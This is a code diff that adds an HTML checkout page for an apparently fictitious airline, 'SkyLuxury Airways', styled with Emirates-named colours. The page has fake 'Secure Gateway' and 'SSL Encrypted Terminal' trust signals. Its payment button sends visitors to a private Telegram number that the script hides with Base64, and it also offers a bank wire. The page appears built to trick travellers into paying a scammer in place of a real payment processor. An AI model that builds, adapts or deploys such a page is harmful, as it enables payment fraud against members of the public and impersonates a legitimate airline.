@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Checkout | SkyLuxury Airways</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root {
+            --emirates-red: #d71921;
+            --gold: #d4af37;
+            --dark: #1a1a1a;
+            --success: #28a745;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #f4f7f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        .payment-container {
+            background: white;
+            width: 100%;
+            max-width: 500px;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .payment-container::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 8px;
+            background: linear-gradient(90deg, var(--emirates-red), var(--gold));
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header i {
+            font-size: 40px;
+            color: var(--emirates-red);
+            margin-bottom: 10px;
+        }
+
+        .order-summary {
+            background: #f9f9f9;
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            border: 1px solid #eee;
+        }
+
+        .summary-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-size: 14px;
+            color: #555;
+        }
+
+        .total-amount {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 2px dashed #ddd;
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--dark);
+        }
+
+        .payment-methods {
+            margin-bottom: 25px;
+        }
+
+        .method-option {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 15px;
+            border: 2px solid #eee;
+            border-radius: 10px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .method-option:hover {
+            border-color: var(--gold);
+            background: #fffdf5;
+        }
+
+        .method-option i {
+            font-size: 20px;
+            color: var(--dark);
+        }
+
+        .pay-btn {
+            width: 100%;
+            padding: 16px;
+            background: var(--dark);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .pay-btn:hover {
+            background: var(--emirates-red);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(215, 25, 33, 0.3);
+        }
+
+        .security-badge {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+
+        #loader {
+            display: none;
+            text-align: center;
+            margin-top: 15px;
+            color: var(--success);
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="payment-container">
+        <div class="header">
+            <i class="fas fa-shield-alt"></i>
+            <h2>Secure Payment</h2>
+            <p style="color: #888; font-size: 14px;">Complete your booking with SkyLuxury</p>
+        </div>
+
+        <div class="order-summary">
+            <div id="items-list">
+                </div>
+            <div class="total-amount">
+                <span>Total Due:</span>
+                <span id="display-total">$0.00</span>
+            </div>
+        </div>
+
+        <div class="payment-methods">
+            <p style="font-weight: 600; font-size: 14px; margin-bottom: 10px;">Select Payment Method:</p>
+            <div class="method-option">
+                <i class="fab fa-telegram"></i>
+                <span>Direct Agent Verification (Instant)</span>
+            </div>
+            <div class="method-option">
+                <i class="fas fa-university"></i>
+                <span>Bank Transfer / Wire</span>
+            </div>
+        </div>
+
+        <button class="pay-btn" onclick="handlePayment()">
+            CONFIRM & PAY NOW <i class="fas fa-lock"></i>
+        </button>
+
+        <div id="loader">
+            <i class="fas fa-spinner fa-spin"></i> Connecting to Secure Gateway...
+        </div>
+
+        <div class="security-badge">
+            <i class="fas fa-check-circle"></i> SSL Encrypted Terminal
+        </div>
+    </div>
+
+    <script>
+        // Load data from Dashboard/Cart
+        function loadSummary() {
+            const cart = JSON.parse(localStorage.getItem('airlineCart')) || [];
+            const displayTotal = document.getElementById('display-total');
+            const itemsList = document.getElementById('items-list');
+            
+            let total = 0;
+            cart.forEach(item => {
+                total += item.price;
+                itemsList.innerHTML += `
+                    <div class="summary-item">
+                        <span>${item.flight}</span>
+                        <strong>$${item.price}</strong>
+                    </div>`;
+            });
+            displayTotal.innerText = `$${total.toLocaleString()}`;
+        }
+
+        // The "Coded" Telegram Redirection Logic
+        function handlePayment() {
+            const btn = document.querySelector('.pay-btn');
+            const loader = document.getElementById('loader');
+
+            btn.style.display = 'none';
+            loader.style.display = 'block';
+
+            // Base64 Encoded Telegram target for security/obfuscation
+            // Decodes to the telegram link for your number
+            const protocol = "aHR0cHM6Ly90Lm1lLw=="; // https://t.me/
+            const target = "ODU1OTc0NTY5NTEw"; // 855974569510 (Encoded)
+            
+            const destination = atob(protocol) + atob(target);
+
+            setTimeout(() => {
+                window.location.href = destination;
+            }, 1500);
+        }
+
+        loadSummary();
+    </script>
+</body>
+</html>
